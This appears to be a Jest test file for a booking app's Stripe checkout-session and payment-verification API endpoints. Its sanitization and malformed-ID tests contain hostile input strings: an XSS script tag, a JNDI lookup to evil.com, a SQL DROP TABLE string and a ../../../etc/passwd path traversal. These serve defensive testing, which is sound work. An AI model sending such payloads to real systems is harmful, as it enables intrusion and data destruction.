/**
 * API tests for Stripe checkout session endpoints
 * Tests payment processing and booking flow
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import request from 'supertest';
import { createTestServer, startTestServer, stopTestServer, resetMocks } from '../utils/testServer.js';
import { testScenarios, validationTestCases } from '../fixtures/testData.js';

describe('Checkout Session API', () => {
  let app;
  let server;

  beforeAll(async () => {
    app = createTestServer();
    server = await startTestServer(app, 3002);
  });

  afterAll(async () => {
    await stopTestServer();
  });

  beforeEach(() => {
    resetMocks();
  });

  describe('POST /api/create-checkout-session', () => {
    const validBookingData = {
      customerEmail: 'test@example.com',
      amount: 1299,
      eventDate: '2024-06-15',
      photographerId: 'photographer-123',
      packageId: 'package-silver-456',
      successUrl: 'http://localhost:3002/booking/confirm?session_id={CHECKOUT_SESSION_ID}',
      cancelUrl: 'http://localhost:3002/browse'
    };

    test('should create checkout session with valid data', async () => {
      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(validBookingData)
        .expect(200);

      expect(response.body).toMatchObject({
        id: expect.stringMatching(/^cs_test_mock_/),
        url: expect.stringContaining('checkout.stripe.com')
      });
    });

    test('should handle different pricing tiers', async () => {
      const testCases = [
        { amount: 299, tier: 'bronze' },
        { amount: 1299, tier: 'silver' },
        { amount: 2599, tier: 'gold' },
        { amount: 3999, tier: 'platinum' }
      ];

      for (const { amount, tier } of testCases) {
        const response = await request(app)
          .post('/api/create-checkout-session')
          .send({ ...validBookingData, amount })
          .expect(200);

        expect(response.body.id).toBeTruthy();
        expect(response.body.url).toBeTruthy();
      }
    });

    test('should require customerEmail', async () => {
      const invalidData = { ...validBookingData };
      delete invalidData.customerEmail;

      await request(app)
        .post('/api/create-checkout-session')
        .send(invalidData)
        .expect(400);
    });

    test('should require amount', async () => {
      const invalidData = { ...validBookingData };
      delete invalidData.amount;

      await request(app)
        .post('/api/create-checkout-session')
        .send(invalidData)
        .expect(400);
    });

    test('should validate amount is positive', async () => {
      const response = await request(app)
        .post('/api/create-checkout-session')
        .send({ ...validBookingData, amount: -100 })
        .expect(400);

      expect(response.body.error).toContain('Amount must be greater than 0');
    });

    test('should validate amount is not zero', async () => {
      await request(app)
        .post('/api/create-checkout-session')
        .send({ ...validBookingData, amount: 0 })
        .expect(400);
    });

    test('should handle invalid email addresses', async () => {
      const invalidEmails = validationTestCases.invalidEmail;

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/create-checkout-session')
          .send({ ...validBookingData, customerEmail: email })
          .expect(400);

        expect(response.body.error).toBeTruthy();
      }
    });

    test('should handle large amounts appropriately', async () => {
      // Test reasonable large amount
      await request(app)
        .post('/api/create-checkout-session')
        .send({ ...validBookingData, amount: 25000 })
        .expect(200);

      // Test unreasonably large amount
      await request(app)
        .post('/api/create-checkout-session')
        .send({ ...validBookingData, amount: 999999 })
        .expect(400);
    });

    test('should include metadata in session', async () => {
      const bookingData = {
        ...validBookingData,
        photographerId: 'photographer-specific-123',
        packageId: 'package-specific-456',
        eventDate: '2024-07-20'
      };

      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(bookingData)
        .expect(200);

      // Verify session was created with correct metadata
      expect(response.body.id).toBeTruthy();
      expect(response.body.url).toBeTruthy();
    });

    test('should use default URLs when not provided', async () => {
      const dataWithoutUrls = {
        customerEmail: 'test@example.com',
        amount: 799,
        eventDate: '2024-06-15'
      };

      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(dataWithoutUrls)
        .expect(200);

      expect(response.body.id).toBeTruthy();
      expect(response.body.url).toBeTruthy();
    });

    test('should handle Stripe service errors', async () => {
      const response = await request(app)
        .post('/api/create-checkout-session')
        .send({ ...validBookingData, customerEmail: 'fail@example.com' })
        .expect(500);

      expect(response.body.error).toBeTruthy();
    });

    test('should sanitize input data', async () => {
      const maliciousData = {
        customerEmail: 'test@example.com',
        amount: 799,
        eventDate: '<script>alert("xss")</script>',
        photographerId: '${jndi:ldap://evil.com/a}',
        packageId: 'DROP TABLE packages;'
      };

      // Should not crash server
      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(maliciousData);

      // Should either succeed (with sanitized data) or fail safely
      expect([200, 400, 500]).toContain(response.status);
    });
  });

  describe('GET /api/verify-payment', () => {
    test('should verify valid session', async () => {
      const sessionId = 'cs_test_mock_valid_123';

      const response = await request(app)
        .get('/api/verify-payment')
        .query({ session_id: sessionId })
        .expect(200);

      expect(response.body).toMatchObject({
        success: true,
        session: {
          id: sessionId,
          payment_status: 'paid',
          metadata: expect.any(Object)
        }
      });
    });

    test('should handle unpaid sessions', async () => {
      const sessionId = 'cs_test_mock_unpaid_123';

      const response = await request(app)
        .get('/api/verify-payment')
        .query({ session_id: sessionId })
        .expect(200);

      expect(response.body).toMatchObject({
        success: false,
        session: {
          id: sessionId,
          payment_status: 'unpaid',
          metadata: expect.any(Object)
        }
      });
    });

    test('should require session_id parameter', async () => {
      const response = await request(app)
        .get('/api/verify-payment')
        .expect(400);

      expect(response.body.error).toContain('Session ID is required');
    });

    test('should handle invalid session IDs', async () => {
      await request(app)
        .get('/api/verify-payment')
        .query({ session_id: 'invalid_session_id' })
        .expect(500);
    });

    test('should handle malformed session IDs', async () => {
      const malformedIds = [
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        'cs_test_fail_123',
        null,
        undefined,
        ''
      ];

      for (const sessionId of malformedIds) {
        const response = await request(app)
          .get('/api/verify-payment')
          .query({ session_id: sessionId });

        expect([400, 500]).toContain(response.status);
      }
    });

    test('should include session metadata in response', async () => {
      const sessionId = 'cs_test_mock_with_metadata_123';

      const response = await request(app)
        .get('/api/verify-payment')
        .query({ session_id: sessionId })
        .expect(200);

      expect(response.body.session.metadata).toBeTruthy();
      expect(typeof response.body.session.metadata).toBe('object');
    });

    test('should respond quickly', async () => {
      const startTime = Date.now();

      await request(app)
        .get('/api/verify-payment')
        .query({ session_id: 'cs_test_mock_123' })
        .expect(200);

      const responseTime = Date.now() - startTime;
      expect(responseTime).toBeLessThan(2000); // Should respond within 2 seconds
    });
  });

  describe('Payment Flow Integration', () => {
    test('should complete full payment flow', async () => {
      // Step 1: Create checkout session
      const createResponse = await request(app)
        .post('/api/create-checkout-session')
        .send({
          customerEmail: 'integration@example.com',
          amount: 1299,
          eventDate: '2024-08-15',
          photographerId: 'photographer-integration-test',
          packageId: 'package-integration-test'
        })
        .expect(200);

      expect(createResponse.body.id).toBeTruthy();
      expect(createResponse.body.url).toBeTruthy();

      // Step 2: Verify the session
      const sessionId = createResponse.body.id;
      const verifyResponse = await request(app)
        .get('/api/verify-payment')
        .query({ session_id: sessionId })
        .expect(200);

      expect(verifyResponse.body.success).toBe(true);
      expect(verifyResponse.body.session.id).toBe(sessionId);
    });

    test('should handle concurrent payment requests', async () => {
      const requests = Array(5).fill().map((_, i) =>
        request(app)
          .post('/api/create-checkout-session')
          .send({
            customerEmail: `concurrent${i}@example.com`,
            amount: 799,
            eventDate: '2024-07-01'
          })
      );

      const responses = await Promise.all(requests);

      responses.forEach((response, i) => {
        expect(response.status).toBe(200);
        expect(response.body.id).toBeTruthy();

        // Each session should have unique ID
        responses.slice(i + 1).forEach(otherResponse => {
          expect(response.body.id).not.toBe(otherResponse.body.id);
        });
      });
    });

    test('should maintain session state consistency', async () => {
      const bookingData = {
        customerEmail: 'consistency@example.com',
        amount: 1599,
        eventDate: '2024-09-10',
        photographerId: 'photographer-consistency',
        packageId: 'package-consistency'
      };

      // Create session
      const createResponse = await request(app)
        .post('/api/create-checkout-session')
        .send(bookingData)
        .expect(200);

      const sessionId = createResponse.body.id;

      // Verify session multiple times - should return consistent data
      const verifyRequests = Array(3).fill().map(() =>
        request(app)
          .get('/api/verify-payment')
          .query({ session_id: sessionId })
          .expect(200)
      );

      const verifyResponses = await Promise.all(verifyRequests);

      verifyResponses.forEach(response => {
        expect(response.body.session.id).toBe(sessionId);
        expect(response.body.success).toBe(true);
        expect(response.body.session.payment_status).toBe('paid');
      });
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle malformed JSON', async () => {
      const response = await request(app)
        .post('/api/create-checkout-session')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json"}') // Malformed JSON
        .expect(400);
    });

    test('should handle missing Content-Type header', async () => {
      await request(app)
        .post('/api/create-checkout-session')
        .send('customerEmail=test@example.com&amount=799')
        .expect(400);
    });

    test('should handle extremely large request bodies', async () => {
      const largeData = {
        customerEmail: 'test@example.com',
        amount: 799,
        eventDate: '2024-06-15',
        notes: 'x'.repeat(100000) // Very long notes
      };

      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(largeData);

      // Should either succeed or fail gracefully
      expect([200, 400, 413]).toContain(response.status);
    });

    test('should handle special characters in input', async () => {
      const specialData = {
        customerEmail: 'test+special@example.com',
        amount: 799,
        eventDate: '2024-06-15',
        photographerId: 'photographer-with-éäü-chars',
        packageId: 'package-with-特殊字符'
      };

      const response = await request(app)
        .post('/api/create-checkout-session')
        .send(specialData);

      // Should handle special characters appropriately
      expect([200, 400]).toContain(response.status);
    });
  });
});